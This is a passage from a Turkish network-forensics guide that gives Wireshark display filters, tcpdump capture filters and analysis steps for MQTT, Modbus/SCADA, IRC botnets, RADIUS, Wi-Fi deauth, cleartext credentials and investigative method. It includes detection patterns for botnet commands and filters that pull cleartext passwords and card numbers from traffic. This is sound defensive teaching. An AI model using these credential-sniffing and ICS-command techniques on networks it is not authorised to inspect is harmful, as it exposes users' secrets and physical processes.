**Filtreden sonra yol tarifi:**

1. MQTT CONNECT paketlerinde kullanıcı adı/parola düz metin mi kontrol et (TLS yoksa açıktır).
2. Topic'leri (mqtt.topic) listele; cihaz yapısı ve kontrol konuları hakkında bilgi verir.
3. PUBLISH mesaj içeriklerini (mqtt.msg) oku; sensör verisi veya komut olabilir.
4. Yetkisiz bir abonenin tüm topic'leri (#) dinlemesi bilgi sızıntısıdır.

**Terimler:**

- **MQTT**: Hafif IoT mesajlaşma protokolü (TCP 1883; TLS 8883).
- **Topic**: Mesajların yayınlandığı/abone olunduğu kanal.
- **Broker**: MQTT mesajlarını dağıtan merkezi sunucu.

> **Anlık karar:** 1883 portu = şifresiz MQTT = kimlik bilgisi ve komutlar açık. IoT vakalarında ilk bakılan yer.


</details>

<details>
<summary><strong>214 · Modbus/SCADA endüstriyel kontrol trafiği</strong></summary>

**Metafor:** Bir fabrikanın kontrol panelindeki anahtarların uzaktan çevrilmesi; "vanayı aç", "motoru durdur" komutları açıkça gidiyor.

**Senden istenen:** "Endüstriyel kontrol sistemine yetkisiz komut var mı?"

**Filtreler (araştırma yolu):**

- `modbus` → Modbus trafiği
- `mbtcp` → Modbus/TCP (port 502)
- `modbus.func_code == 6 || modbus.func_code == 16` → register yazma (değer değiştirme)
- `modbus.func_code == 5 || modbus.func_code == 15` → coil yazma (anahtar aç/kapa)

**Filtreden sonra yol tarifi:**

1. Modbus trafiğini filtrele; okuma (3,4) ve yazma (5,6,15,16) fonksiyon kodlarını ayır.
2. Yazma komutları fiziksel süreçleri değiştirir; kaynağının yetkili HMI/SCADA olup olmadığını kontrol et.
3. Beklenmedik kaynaktan yazma komutu = yetkisiz kontrol girişimi.
4. Yazılan register/coil adreslerini ve değerlerini oku; hangi sürecin hedeflendiğini belirle.

**Terimler:**

- **Modbus**: Endüstriyel kontrol protokolü (TCP 502); kimlik doğrulaması yoktur.
- **Coil / Register**: Dijital anahtar / analog değer.
- **SCADA / HMI**: Endüstriyel kontrol ve operatör arayüzü.

> **Anlık karar:** ICS/SCADA ağında yazma komutu = fiziksel etki. Kaynağın meşru olup olmadığı hayati önemdedir.


</details>

<details>
<summary><strong>215 · IRC tabanlı botnet kontrolü</strong></summary>

**Metafor:** Eski bir sohbet odasında, herkesin gördüğü ama komutların botlara gittiği bir kanal.

**Senden istenen:** "IRC üzerinden botnet komutları var mı?"

**Filtreler (araştırma yolu):**

- `irc` → IRC trafiği
- `irc.request.command == "JOIN"` → kanala katılma
- `irc.request contains "PRIVMSG"` → kanala/kişiye mesaj (komutlar burada)
- `irc.request.trailer matches "(\\.ddos|\\.scan|\\.download|!bot|advscan)"` → klasik bot komutları

**Filtreden sonra yol tarifi:**

1. IRC akışını Follow Stream ile aç; kanal adları ve mesajlar düz metindir.
2. Çok sayıda istemcinin aynı kanala katılıp aynı komutları alması botnet işaretidir.
3. PRIVMSG içeriğinde komut desenleri (.scan, .ddos, download) ara.
4. Bot adlarını ve C2 kanalını IOC listesine ekle.

**Terimler:**

- **IRC**: Internet Relay Chat; eski ama hâlâ görülen botnet C2 kanalı.
- **PRIVMSG**: IRC mesaj komutu.
- **Channel**: Sohbet kanalı (#kanal).

> **Anlık karar:** Kurumsal ağda IRC neredeyse hiç meşru değildir. Görürsen ve komut desenleri varsa botnet C2'dir.


</details>

<details>
<summary><strong>216 · LPD/IPP yazıcı ve diğer ofis protokolleri</strong></summary>

**Metafor:** Ofis yazıcısının kuyruğundaki belgeleri okumak; bazen gizli evraklar oradan geçer.

**Senden istenen:** "Yazdırılan belgelerde hassas veri var mı?"

**Filtreler (araştırma yolu):**

- `ipp` → Internet Printing Protocol
- `lpd` → Line Printer Daemon (port 515)
- `tcp.port == 9100` → ham yazıcı (JetDirect) portu

**Filtreden sonra yol tarifi:**

1. Yazdırma trafiğini filtrele; 9100 ham veri genelde PostScript/PCL içerir.
2. Follow TCP Stream ile yazdırılan belge içeriğini (metin kısımlarını) oku.
3. Hassas belgelerin yazdırılması veya yazıcının veri sızdırma kanalı olarak kullanılması değerlendirilir.
4. Yazıcıya yetkisiz erişim (firmware, config) ayrıca incelenir.

**Terimler:**

- **IPP / LPD**: Ağ yazdırma protokolleri.
- **9100**: Doğrudan ham yazıcı portu (JetDirect).
- **PostScript/PCL**: Yazıcı dilleri.

> **Anlık karar:** Yazıcılar unutulan uç noktalardır; hem veri sızar hem de atlama noktası olur. Trafiğini küçümseme.


</details>

<details>
<summary><strong>217 · NTP ve zaman manipülasyonu</strong></summary>

**Metafor:** Bir binanın tüm saatlerini kurcalayıp olay kayıtlarının zamanını karıştırmak.

**Senden istenen:** "Zaman senkronizasyonu manipüle edilmiş mi?", "NTP amplifikasyonu var mı?"

**Filtreler (araştırma yolu):**

- `ntp` → NTP trafiği
- `ntp.flags.mode == 4` → sunucu cevabı
- `ntp.priv.reqcode == 42` → monlist isteği (amplifikasyon)

**Filtreden sonra yol tarifi:**

1. NTP trafiğini filtrele; istemcilerin hangi sunucuyla senkron olduğuna bak.
2. Beklenmedik/dış NTP sunucusu kullanımı zaman manipülasyonu riskidir (log zaman damgalarını bozabilir).
3. monlist (reqcode 42) istekleri amplifikasyon saldırısı aracıdır (Problem 059).
4. Zaman kayması tespit edersen tüm zaman çizelgesi analizini buna göre düzelt.

**Terimler:**

- **NTP**: Ağ Zaman Protokolü (UDP 123).
- **monlist**: Eski NTP'nin istismar edilen sorgu komutu.

> **Anlık karar:** Saat yanlışsa bütün zaman çizelgesi yanlış olur. NTP anomalisi tüm analizi etkiler, erken kontrol et.


</details>

<details>
<summary><strong>218 · Kerberos öncesi: RADIUS/TACACS kimlik doğrulama</strong></summary>

**Metafor:** Giriş turnikesinin merkezî kimlik kontrolü; kimin geçtiği ve denemelerin kaydı tutulur.

**Senden istenen:** "Ağ erişim kimlik doğrulamasında (VPN, Wi-Fi, cihaz girişi) başarısızlık/anomali var mı?"

**Filtreler (araştırma yolu):**

- `radius` → RADIUS trafiği
- `radius.code == 1` → Access-Request
- `radius.code == 2` → Access-Accept (başarılı)
- `radius.code == 3` → Access-Reject (başarısız)
- `radius.User_Name` → denenen kullanıcı adı

**Filtreden sonra yol tarifi:**

1. RADIUS Access-Request'leri filtrele ve User-Name'leri listele.
2. Access-Reject (code 3) dalgası = kimlik doğrulama deneme saldırısı (VPN/Wi-Fi brute force).
3. Access-Accept ile başarılı girişleri belirle.
4. Parola RADIUS'ta şifrelidir (shared secret ile) ama kullanıcı adı ve politika açık görünebilir.

**Terimler:**

- **RADIUS**: Merkezî kimlik doğrulama/yetkilendirme protokolü (UDP 1812/1813).
- **TACACS+**: Cisco'nun benzer amaçlı protokolü.
- **Access-Accept/Reject**: Giriş kabul/red.

> **Anlık karar:** VPN/Wi-Fi brute force'u RADIUS Reject dalgasında görürsün. User-Name dağılımı brute force mu spraying mi söyler.


</details>

<details>
<summary><strong>219 · DHCP ile ağ envanteri ve işletim sistemi parmak izi</strong></summary>

**Metafor:** Yeni gelen her misafirin resepsiyonda doldurduğu formdan cihazını ve adını öğrenmek.

**Senden istenen:** "Ağda hangi cihazlar var, hangi işletim sistemleri?"

**Filtreler (araştırma yolu):**

- `dhcp.option.dhcp == 1` → DHCP Discover
- `dhcp.option.hostname` → cihaz adları
- `dhcp.option.vendor_class_id` → işletim sistemi/cihaz türü ipucu
- `dhcp.option.requested_ip_address` → istenen IP (statik tercih izi)

**Filtreden sonra yol tarifi:**

1. DHCP Discover/Request paketlerini filtrele.
2. Option 12 (hostname) ve Option 60 (vendor class: MSFT 5.0, android-dhcp, dhcpcd) ile cihaz envanteri çıkar.
3. Option 55 (parameter request list) parmak izi işletim sistemini daha kesin belirler (fingerbank mantığı).
4. Beklenmedik/yeni cihazları (rogue device) işaretle.

**Terimler:**

- **DHCP options**: DHCP paketlerindeki ek bilgi alanları.
- **Vendor class (Option 60)**: İstemcinin kendini tanıttığı tür bilgisi.

> **Anlık karar:** DHCP, ağ envanteri çıkarmanın sessiz ve zengin kaynağıdır. Her yeni cihaz burada ilk izini bırakır.


</details>

<details>
<summary><strong>220 · Şifresiz web oturumunda hassas veri (kişisel bilgi/kart)</strong></summary>

**Metafor:** Açık kartpostalda kredi kartı numarası yazmak; postacı dahil herkes okur.

**Senden istenen:** "Şifresiz trafikte hassas veri (kart, kimlik no, sağlık) açığa çıkmış mı?"

**Filtreler (araştırma yolu):**

- `http && frame matches "[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{4}"` → kredi kartı numarası deseni
- `http.request.uri matches "(ssn|tckn|card|cc_number|cvv)"` → hassas alan adları

**Filtreden sonra yol tarifi:**

1. Şifresiz HTTP içinde kart numarası, kimlik numarası gibi desenleri regex ile ara.
2. Bulunan veriyi Follow Stream ile bağlamında doğrula (yanlış pozitif olabilir).
3. Hassas verinin şifresiz iletilmesi hem uyum (PCI-DSS, KVKK) hem güvenlik bulgusudur.
4. Raporda veriyi maskeleyerek belirt (ör. 4111-****-****-1234); ham hassas veriyi rapora koyma.

**Terimler:**

- **PCI-DSS / KVKK**: Kart verisi / kişisel veri koruma düzenlemeleri.
- **PII**: Kişisel olarak tanımlanabilir bilgi.

> **Anlık karar:** Hassas veri raporda maskelenir. Bulguyu kanıtla ama veriyi ifşa etme; bu da bir güvenlik sorumluluğudur.


</details>

<details>
<summary><strong>221 · SMB/NetBIOS üzerinden yazıcı ve paylaşım gözatma</strong></summary>

**Metafor:** Bir kattaki tüm ortak dolapların ve panoların envanterini çıkarmak.

**Senden istenen:** "Ağdaki paylaşımlar ve kaynaklar listelenmiş mi?"

**Filtreler (araştırma yolu):**

- `browser` → Microsoft ağ gözatma protokolü
- `srvsvc` → sunucu servisi (paylaşım listeleme)
- `smb2.cmd == 3 && smb2.tree matches "IPC\\$"` → sayım bağlantıları

**Filtreden sonra yol tarifi:**

1. browser ve srvsvc trafiğiyle ağ gözatma/paylaşım listeleme işlemlerini bul.
2. Hangi kaynakların listelendiğini çıkar.
3. Tek kaynaktan sistemli sayım = keşif (Problem 174 ile birlikte değerlendir).
4. Keşif zamanını zaman çizelgesine ekle.

**Terimler:**

- **Computer Browser**: Eski Windows ağ gözatma servisi.
- **srvsvc**: Paylaşımları listeleyen RPC servisi.

> **Anlık karar:** Gözatma/sayım trafiği keşif aşamasının parçasıdır; ilk erişimden sonra sık görülür.


</details>

<details>
<summary><strong>222 · Düz metin veritabanı trafiği (MySQL, PostgreSQL, MSSQL)</strong></summary>

**Metafor:** Arşiv memuruna yüksek sesle "şu tablodaki tüm kayıtları oku" demek; herkes hem soruyu hem cevabı duyar.

**Senden istenen:** "Veritabanına hangi sorgular gitti, veri çekildi mi, kimlik bilgisi açık mı?"

**Filtreler (araştırma yolu):**

- `mysql.query` → MySQL sorguları
- `pgsql.query` → PostgreSQL sorguları
- `tds.query` → MSSQL (TDS) sorguları
- `mysql.user` → MySQL giriş kullanıcı adı

**Filtreden sonra yol tarifi:**

1. Veritabanı sorgularını filtrele ve içeriklerini oku (şifresizse düz metin).
2. SELECT ... yoğunluğu veri okuma, büyük sonuç dönen sorgular veri çekme demektir.
3. Giriş paketlerinde kullanıcı adını (mysql.user) ve kimlik doğrulama yöntemini incele.
4. Olağan dışı sorgular (tüm tabloyu çekme, bilgi şeması sorgusu) sızdırma veya SQLi arkası olabilir.

**Terimler:**

- **TDS**: MSSQL'in iletişim protokolü.
- **Veritabanı portları**: MySQL 3306, PostgreSQL 5432, MSSQL 1433.

> **Anlık karar:** Şifresiz veritabanı trafiğinde sorgular açıktır. Büyük SELECT sonuçları veri sızdırmanın doğrudan kanıtıdır.


</details>

<details>
<summary><strong>223 · Kablosuz (Wi-Fi) yönetim çerçeveleri ve deauth saldırısı</strong></summary>

**Metafor:** Bir toplantıda birinin herkese sahte "toplantı bitti, çıkın" anonsu yaparak odayı boşaltması.

**Senden istenen:** "Wi-Fi'da deauth/disassoc saldırısı var mı?" (kayıt monitor modda alınmışsa)

**Filtreler (araştırma yolu):**

- `wlan.fc.type_subtype == 0x0c` → Deauthentication çerçeveleri
- `wlan.fc.type_subtype == 0x0a` → Disassociation çerçeveleri
- `wlan.fixed.reason_code` → ayrılma sebep kodu
- `eapol` → WPA el sıkışma (4-way handshake)

**Filtreden sonra yol tarifi:**

1. Deauth/disassoc çerçevelerini filtrele; kısa sürede çok sayıda = deauth saldırısı (aireplay-ng).
2. Hedef istemci ve AP MAC'lerini (wlan.sa, wlan.da) çıkar.
3. Deauth sonrası yeniden bağlanan istemcilerin EAPOL 4-way handshake'ini yakala; el sıkışma analizi için gerekir.
4. Saldırının amacını değerlendir: el sıkışma yakalama, hizmet kesme veya rogue AP'ye yönlendirme.

**Terimler:**

- **Deauth**: İstemciyi ağdan düşüren yönetim çerçevesi (şifrelenmez).
- **Monitor mode**: Kablosuz kartın tüm çerçeveleri yakaladığı mod.
- **EAPOL**: WPA kimlik doğrulama el sıkışması.

> **Anlık karar:** Wi-Fi analizi için kayıt monitor modda alınmış olmalı (802.11 çerçeveleri görünür). Normal kayıtta sadece Ethernet görürsün.


</details>

<details>
<summary><strong>224 · Syslog akışında güvenlik olaylarını okumak</strong></summary>

**Metafor:** Bir binanın tüm güvenlik görevlilerinin notlarını tek bir merkez deftere yazması; o defteri okuyan tüm olayı görür.

**Senden istenen:** "Cihazlardan gelen log mesajlarında güvenlik olayı var mı?"

**Filtreler (araştırma yolu):**

- `syslog` → Syslog trafiği
- `syslog.msg contains "failed" || syslog.msg contains "denied"` → başarısız/engellenen olaylar
- `syslog.level <= 3` → yüksek önem (error ve üstü) mesajlar

**Filtreden sonra yol tarifi:**

1. Syslog trafiğini filtrele; mesajlar (syslog.msg) düz metindir, doğrudan okunur.
2. Başarısız giriş, erişim reddi, firewall drop gibi anahtar kelimeleri ara.
3. Önem seviyesine (facility/severity) göre kritik olayları önceliklendir.
4. Syslog UDP 514'te genelde şifresizdir; mesajlar sahteciliğe açıktır, kaynağı doğrula.

**Terimler:**

- **Syslog**: Cihaz log mesajlarını merkeze taşıyan protokol (UDP 514).
- **Severity**: Mesaj önem derecesi (0 acil ... 7 hata ayıklama).

> **Anlık karar:** Syslog, ağ cihazlarının "ne gördüğünü" anlatır. Pcap'te varsa, cihaz loglarını ayrıca istemeden hikâyenin yarısını verir.


</details>

<details>
<summary><strong>225 · Kerberos/LDAP olmadan düz metin dizin ve kimlik servisleri</strong></summary>

**Metafor:** Kimlik kontrolünün hoparlörle yapıldığı bir giriş; sorulan ve verilen her bilgi duyulur.

**Senden istenen:** "Hangi servislerde kimlik bilgisi/oturum açık (şifresiz) gidiyor?"

**Filtreler (araştırma yolu):**

- `ftp.request.command == "PASS" || pop.request.command == "PASS" || http.authbasic || snmp.community || telnet.data` → klasik düz metin kimlik taşıyıcıları
- `ldap.authentication == 0` → LDAP düz metin bind

**Menü / araç:**

- Tools ▸ Credentials → Wireshark'ın otomatik topladığı tüm kimlik bilgileri

**Filtreden sonra yol tarifi:**

1. Düz metin kimlik taşıyan protokolleri tek filtrede topla.
2. Tools ▸ Credentials penceresiyle Wireshark'ın otomatik tespitlerini gör.
3. Her bulguyu "hangi protokol, hangi hesap, hangi kaynak-hedef" diye kaydet.
4. Şifresiz kimlik iletimini zafiyet olarak raporla; şifreli alternatifleri (FTPS, LDAPS, HTTPS) öner.

**Terimler:**

- **Cleartext credentials**: Şifrelenmeden iletilen kimlik bilgileri.
- **Credentials penceresi**: Wireshark'ın kimlik bilgisi toplama aracı.

> **Anlık karar:** Düz metin kimlik, bir vakada en hızlı "kritik bulgu"dur. Tek bir birleşik filtre çoğunu yakalar; gerisini Credentials penceresi tamamlar.


</details>

## J · Yöntem, Performans, Adli Titizlik, Araçlar ve Raporlama

*Filtre bilmek yetmez; doğru soruyu sormak, doğru yerden yakalamak, kanıtı bozmadan saklamak ve bulguyu anlatmak gerekir. Bu bölüm seni "filtre uygulayan" biri olmaktan "analiz eden" biri yapar. Burada capture (BPF) filtreleri de var: display filtresinden farklı dildir, yakalarken kullanılır.*

<details>
<summary><strong>226 · Capture filtresi mi, display filtresi mi? İkisinin farkı</strong></summary>

**Metafor:** Capture filtresi, kapıdaki fotoğrafçının "sadece kırmızı araba gelirse çek" talimatıdır (kaçan bir daha gelmez). Display filtresi, çekilmiş tüm fotoğraflar arasından kırmızıları ayıklamaktır (hepsi hâlâ elinde).

**Senden istenen:** "Neden filtrem çalışmıyor?", "Hangi filtreyi nerede yazmalıyım?"

**Filtreler (araştırma yolu):**

- `ip.addr == 10.0.0.5 && tcp.port == 445` → display filtresi: kayıt sonrası ekranda süzme

**Komut satırı:**

```bash
tcpdump -i eth0 -w kayit.pcap host 10.0.0.5 and tcp port 445
tshark -i eth0 -f "host 10.0.0.5 and tcp port 445" -w kayit.pcapng
```

**Filtreden sonra yol tarifi:**

1. Yakalarken (capture) BPF dili kullanılır: `host`, `port`, `net`, `tcp`, `and/or/not`. Yakalanmayan paket sonsuza kadar kaybolur.
2. İnceleme sırasında (display) Wireshark dili kullanılır: `ip.addr ==`, `tcp.port ==`, `&&/||/!`. Tüm paketler diskte, sadece görünüm değişir.
3. Hata genelde dilleri karıştırmaktır: capture kutusuna `ip.addr==` yazmak veya display kutusuna `host` yazmak çalışmaz.
4. Kural: Çok veri gelecekse ve neyi istediğin belliyse capture filtresiyle daralt; elindeki dosyada arıyorsan display filtresi kullan.

**Terimler:**

- **BPF**: Berkeley Packet Filter; capture (yakalama) filtre dili.
- **Display filter**: Wireshark'ın inceleme (görüntüleme) filtre dili.

> **Anlık karar:** Capture filtresi geri alınamaz (kaçan paket gider), display filtresi geri alınabilir (filtreyi silersin). Şüphedeysen geniş yakala, dar incele.


</details>

<details>
<summary><strong>227 · Temel BPF capture filtreleri (host, port, net)</strong></summary>

**Metafor:** Fotoğrafçıya önceden "şu kişiyi, şu kapıdan girerken çek" demek.

**Senden istenen:** "Belirli bir host/port/ağ için nasıl yakalama yaparım?"

**Komut satırı:**

```bash
tcpdump -i eth0 host 10.0.0.5
tcpdump -i eth0 net 10.0.0.0/24
tcpdump -i eth0 tcp port 443
tcpdump -i eth0 src host 10.0.0.5 and dst port 445
tcpdump -i eth0 'tcp port 80 or tcp port 443'
```

**Filtreden sonra yol tarifi:**

1. `host X` = X ile tüm trafik; `src host X` / `dst host X` = sadece X'ten/ X'e.
2. `port N` = N portu; `src port` / `dst port` ile yönü daralt.
3. `net X/Y` = bir alt ağ; `and`, `or`, `not` ile birleştir.
4. Birden fazla koşulu tırnak içine al (kabuk karışmasın): `'tcp port 80 or tcp port 443'`.
5. Dosyaya yazmak için `-w dosya.pcap` ekle; okumak için `-r`.

**Terimler:**

- **src/dst**: Kaynak/hedef yönü.
- **net**: Ağ bloğu (CIDR).

> **Anlık karar:** BPF'de alan adları yoktur, sayılar ve anahtar kelimeler vardır. `host google.com` yazarsan DNS'e çevirir; kesinlik için IP kullan.


</details>

<details>
<summary><strong>228 · Gelişmiş BPF: bayrak ve byte seviyesi yakalama</strong></summary>

**Metafor:** Fotoğrafçıya "sadece elini kaldıran kişileri çek" gibi ince bir kural vermek.

**Senden istenen:** "Sadece SYN paketlerini veya belirli bir desenli paketleri nasıl yakalarım?"

**Komut satırı:**

```bash
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack == 0'
tcpdump -i eth0 'tcp[13] & 2 != 0'
tcpdump -i eth0 'icmp[icmptype] == icmp-echo'
tcpdump -i eth0 'udp port 53'
tcpdump -i eth0 'greater 1000'
```

**Filtreden sonra yol tarifi:**

1. `tcp[tcpflags]` ile TCP bayraklarına eriş; `tcp-syn`, `tcp-ack`, `tcp-rst`, `tcp-fin` sabitleri kullan.
2. `tcp[13] & 2 != 0` sadece SYN'leri yakalar (13. byte bayraklardır, 2 = SYN biti).
3. `greater N` / `less N` paket boyutuna göre yakalar.
4. Bu seviyede yakalama, yüksek trafikli ortamda sadece ilgilendiğin olayı kaydetmeni sağlar.

**Terimler:**

- **tcpflags**: TCP bayrak byte'ı.
- **Bit maskeleme (&)**: Belirli bir biti test etme.

> **Anlık karar:** BPF byte seviyesi güçlüdür ama display filtresi kadar okunur değildir. Mümkünse geniş yakala, inceyi display'e bırak.


</details>

<details>
<summary><strong>229 · Doğru yerden yakalamak: sensör yerleşimi</strong></summary>

**Metafor:** Bir hırsızlığı çözmek için kameranın nereye bakması gerektiği. Yanlış açıdaki kamera olayı kaçırır.

**Senden istenen:** "Neden saldırıyı göremiyorum?", "Kaydı nereden almalıyım?"

**Filtreler (araştırma yolu):**

- `ip.src == 10.0.0.0/8 && ip.dst == 10.0.0.0/8` → sadece iç-iç trafik görünüyorsa sensör içeride
- `eth.addr == 00:1a:2b:3c:4d:5e` → gateway MAC'i her pakette görünüyorsa sensör gateway'de

**Filtreden sonra yol tarifi:**

1. Kaydı analiz etmeden önce "bu nereden alınmış?" diye sor. Gördüğün trafik buna bağlıdır.
2. SPAN/mirror port tüm switch trafiğini kopyalar; tek host'un kartı sadece o host'un trafiğini görür (ve broadcast).
3. NAT'ın dış tarafında yakaladıysan iç IP'leri göremezsin, hepsi tek genel IP görünür (Problem 238).
4. DNS sunucusunun arkasındaysan istemci sorgularını göremezsin, sadece DNS sunucusunun dış sorgularını görürsün.
5. Göremediğin şeyi "yok" sanma; sensörün kör noktası olabilir. Raporda kaydın alındığı noktayı belirt.

**Terimler:**

- **SPAN/mirror port**: Switch trafiğini bir porta kopyalayan özellik.
- **TAP**: Hattı fiziksel olarak dinleyen cihaz.
- **Blind spot**: Sensörün göremediği trafik.

> **Anlık karar:** "Trafik yok" ile "sensör görmedi" farklı şeylerdir. Analize her zaman "bu kayıt nereden alındı?" sorusuyla başla.


</details>

<details>
<summary><strong>230 · Promiscuous ve monitor mod: neden sadece kendi trafiğimi görüyorum?</strong></summary>

**Metafor:** Kalabalık bir odada sadece sana söyleneni mi duyuyorsun, yoksa herkesi mi? Kulağının ayarı buna karar verir.

**Senden istenen:** "Başka hostların trafiğini neden göremiyorum?"

**Filtreler (araştırma yolu):**

- `!(eth.addr == 00:1a:2b:3c:4d:5e)` → kendi MAC'in dışındaki çerçeveler (promiscuous çalışıyorsa görünür)

**Filtreden sonra yol tarifi:**

1. Promiscuous mod kapalıysa kart sadece kendine ve broadcast'e gelen çerçeveleri verir; switch'li ağda başkalarının trafiği zaten sana gelmez.
2. Başkalarının trafiğini görmek için SPAN port, TAP veya (kablosuzda) monitor mod gerekir.
3. Kablosuz 802.11 analizi için monitor mod şarttır; yoksa sadece şifre çözülmüş Ethernet benzeri çerçeveler görünür.
4. Elindeki kayıtta sadece tek host'un trafiği varsa, kayıt o host üzerinde alınmış olabilir.

**Terimler:**

- **Promiscuous mode**: Kartın kendine ait olmayan çerçeveleri de kabul etmesi.
- **Monitor mode**: Kablosuz kartın ham 802.11 çerçevelerini yakalaması.

> **Anlık karar:** Modern switch'li ağda "herkesi dinleme" otomatik değildir. Göremiyorsan ya mod kapalı ya sensör yeri yanlış.


</details>

<details>
<summary><strong>231 · Paket yakalama kaybı (dropped packets)</strong></summary>

**Metafor:** Çok hızlı akan bir şelaleyi bardakla toplamaya çalışmak; bir kısmı mutlaka kaçar.

**Senden istenen:** "Analizimde boşluk var, kayıt eksik mi?"

**Filtreler (araştırma yolu):**

- `tcp.analysis.lost_segment` → kayıtta görünmeyen segmentler
- `tcp.analysis.ack_lost_segment` → alındığı onaylanan ama görülmeyen veri

**Komut satırı:**

```bash
capinfos -A kayit.pcapng
```

**Filtreden sonra yol tarifi:**

1. Statistics ▸ Capture File Properties'te "Dropped packets" sayısına bak (yakalayan araç kaydettiyse).
2. Çok sayıda lost_segment + ack_lost_segment = sensör paket kaçırmış (ağ sorunu değil).
3. Yakalama kaybı yüksek trafik, zayıf donanım veya yazma darboğazından olur.
4. Kayıt eksikse çıkardığın dosyalar bozuk olabilir ve "veri yok" sonucun yanlış olabilir; raporda belirt.

**Terimler:**

- **Packet drop**: Yakalama sırasında kaydedilemeyen paket.
- **Capture loss vs network loss**: Sensörün kaçırması vs ağda gerçekten kaybolması.

> **Anlık karar:** Analizdeki boşluğun sebebi ağ mı sensör mü ayır. "ACKed unseen segment" sensörün kör noktasıdır, ağ sağlamdır.


</details>

<details>
<summary><strong>232 · Zaman referansı ve göreli zamanlama (Set/Find Time Reference)</strong></summary>

**Metafor:** Bir yarışta kronometreyi tam olayın başladığı anda sıfırlamak; sonraki her şeyi ona göre ölçmek.

**Senden istenen:** "Olaydan X saniye sonra ne oldu?", "İki olay arası süre ne?"

**Filtreler (araştırma yolu):**

- `frame.time_delta_displayed > 1` → görünen bir önceki pakete göre 1 saniyeden uzun boşluklar

**Menü / araç:**

- Paket seç ▸ sağ tık ▸ Set/Unset Time Reference (Ctrl+T) → o paket sıfır anı olur
- View ▸ Time Display Format ▸ Seconds Since Previous Displayed Packet → ardışık görünen paketler arası süre

**Filtreden sonra yol tarifi:**

1. İlgilendiğin olayı (ör. ilk C2 bağlantısı) seç ve Ctrl+T ile zaman referansı yap.
2. Artık zaman sütunu bu andan itibaren sayar; "olaydan 3.2 sn sonra şu oldu" diyebilirsin.
3. frame.time_delta_displayed ile filtrelenmiş paketler arası boşlukları ölç (beacon aralığı için ideal).
4. Birden fazla referans koyup aşamalar arası süreleri karşılaştırabilirsin.

**Terimler:**

- **Time reference**: Göreli zaman ölçümü için seçilen sıfır noktası.
- **time_delta_displayed**: Ekranda görünen bir önceki pakete göre geçen süre.

> **Anlık karar:** Zaman referansı, "sıra" ve "süre" sorularını saniyede yanıtlar. Olay anını sıfırla, gerisini ona göre oku.


</details>

<details>
<summary><strong>233 · Doğru soruyu sormak: analiz öncesi hipotez kurmak</strong></summary>

**Metafor:** Dedektif rastgele her yeri aramaz; önce "kim, neden, nasıl" hipotezi kurar, sonra onu test eder.

**Senden istenen:** Her yeni pcap karşısında "nereden başlayacağımı bilmiyorum" hissi. Bu problemin tek çözümü yöntemdir.

**Filtreler (araştırma yolu):**

- `http.request || dns.flags.response == 0 || tls.handshake.type == 1` → niyet paketleriyle genel bir fikir edin

**Filtreden sonra yol tarifi:**

1. Önce bağlamı oku: Bu kayıt neden alındı? Bir alarm mı, bir şikâyet mi, bir CTF sorusu mu? Soru sana yön verir.
2. Triage yap (Problem 001): süre, protokoller, top talkers, expert info.
3. Bir hipotez cümlesi kur: "X IP'si Y'yi taradı, Z portundan girdi, dışarı veri sızdırdı." Belirsizse birkaç rakip hipotez yaz.
4. Her adımda sadece hipotezi doğrulayan/çürüten filtreyi uygula; rastgele gezme.
5. Hipotez çürürse güncelle. Analiz, hipotez test etme döngüsüdür.

**Terimler:**

- **Hipotez**: Test edilecek geçici açıklama.
- **Triage**: Önceliklendirme aşaması.

> **Anlık karar:** "Hangi çekmeceyi açayım?" sorusunun cevabı hipotezdir. Hipotezsiz filtre, karanlıkta el yordamıdır. Önce bir cümle kur, sonra filtre yaz.


</details>

<details>
<summary><strong>234 · Karar ağacı: protokole göre doğru çekmeceyi seçmek</strong></summary>

**Metafor:** Acil serviste hasta gelince önce şikâyete göre doğru bölüme yönlendirmek; her hastaya her tetkiki yapmazsın.

**Senden istenen:** "Önümdeki trafik tipine göre hangi analiz adımını izlemeliyim?"

**Filtreler (araştırma yolu):**

- `dns || http || tls.handshake.type == 1 || smb2 || kerberos` → hangi dünyadasın: web mi, Windows mı?

**Filtreden sonra yol tarifi:**

1. Protocol Hierarchy'ye bak ve baskın protokolü belirle; çekmece seçimin buradan başlar.
2. Çok DNS varsa → tünelleme/DGA/C2 çekmecesi (D ve H bölümleri).
3. Çok HTTP varsa → web saldırısı/indirme çekmecesi (E ve H bölümleri).
4. Çok SMB/Kerberos/LDAP varsa → Windows/AD yanal hareket çekmecesi (G bölümü).
5. Çok TLS/şifreli varsa → SNI/sertifika/JA3/zamanlama çekmecesi (F bölümü).
6. TCP SYN yoğunluğu + çok port → tarama çekmecesi (C bölümü).

**Terimler:**

- **Decision tree**: Koşullara göre dallanan karar yapısı.

> **Anlık karar:** Trafik tipi çekmeceni seçer. "Bu hangi dünya?" sorusunu sor (web / Windows / DNS / şifreli / tarama), sonra o bölümün reflekslerine geç.


</details>

<details>
<summary><strong>235 · Yanlış pozitif ve doğrulama: tek kanıtla hüküm vermemek</strong></summary>

**Metafor:** Tek bir tanığın ifadesiyle birini mahkûm etmemek; çapraz kontrol şart.

**Senden istenen:** "Bulgumdan emin değilim, nasıl doğrularım?"

**Filtreler (araştırma yolu):**

- `ip.addr == 203.0.113.50` → şüpheli göstergeyi her açıdan incele

**Filtreden sonra yol tarifi:**

1. Bir bulguyu en az iki bağımsız kanıtla destekle (ör. şüpheli IP: hem DNS çözümü, hem beacon ritmi, hem nadir JA3).
2. Meşru açıklamaları aktif olarak ara: Windows Update, CDN, yedekleme, antivirüs güncellemesi gibi.
3. Yanlış pozitif testi: "Bu davranışın masum bir sebebi olabilir mi?" diye sor. Olabiliyorsa daha çok kanıt topla.
4. Emin olamadığın bulguyu "kesin" değil "olası" olarak raporla; kanıt seviyesini belirt.

**Terimler:**

- **False positive**: Zararsız olanı zararlı sanma.
- **Corroboration**: Bir bulguyu başka kanıtlarla destekleme.

> **Anlık karar:** Tek kanıt hipotezdir, çoklu kanıt sonuçtur. "Olabilir" ile "oldu" arasındaki fark topladığın bağımsız kanıt sayısıdır.


</details>

<details>
<summary><strong>236 · GeoIP ile hedeflerin coğrafi konumu</strong></summary>

**Metafor:** Telefon kayıtlarındaki numaraların hangi ülkeye ait olduğunu haritada görmek.

**Senden istenen:** "Trafik hangi ülkelere gidiyor?", "Beklenmedik ülke bağlantısı var mı?"

**Filtreler (araştırma yolu):**

- `ip.geoip.country == "Russia"` → belirli ülkeye giden trafik
- `ip.geoip.src_country == "China"` → belirli ülkeden gelen trafik
